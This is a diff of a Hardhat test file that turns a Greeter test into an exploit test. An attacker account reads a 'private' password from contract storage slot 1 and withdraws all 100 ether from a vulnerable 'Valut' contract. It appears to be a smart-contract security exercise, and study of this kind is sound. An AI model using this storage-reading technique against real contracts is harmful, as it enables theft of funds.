@@ -1,19 +1,29 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
-describe("Greeter", function () {
-  it("Should return the new greeting once it's changed", async function () {
-    const Greeter = await ethers.getContractFactory("Greeter");
-    const greeter = await Greeter.deploy("Hello, world!");
-    await greeter.deployed();
+describe("Valut", function () {
+  let deployer, attacker;
 
-    expect(await greeter.greet()).to.equal("Hello, world!");
+  beforeEach(async function() {
+    [deployer, attacker] = await ethers.getSigners();
 
-    const setGreetingTx = await greeter.setGreeting("Hola, mundo!");
+    const Valut = await ethers.getContractFactory("Valut", deployer);
+    this.valut = await Valut.deploy(ethers.utils.formatBytes32String("myPassword"));
 
-    // wait until the transaction is mined
-    await setGreetingTx.wait();
-
-    expect(await greeter.greet()).to.equal("Hola, mundo!");
+    await this.valut.deposit({value: ethers.utils.parseEther("100")});
   });
+
+  it("Should be possible to access to its private variables", async function() {
+
+    let initialBalanceAttacker = await ethers.provider.getBalance(this.valut.address);
+
+    let password = await ethers.provider.getStorageAt(this.valut.address, 1);
+    await this.valut.connect(attacker).withdraw(password);
+
+    let finalBalanceContract = await ethers.provider.getBalance(this.valut.address);
+    let finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);
+
+    expect(finalBalanceContract).to.eq(0);
+    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
+  })
 });
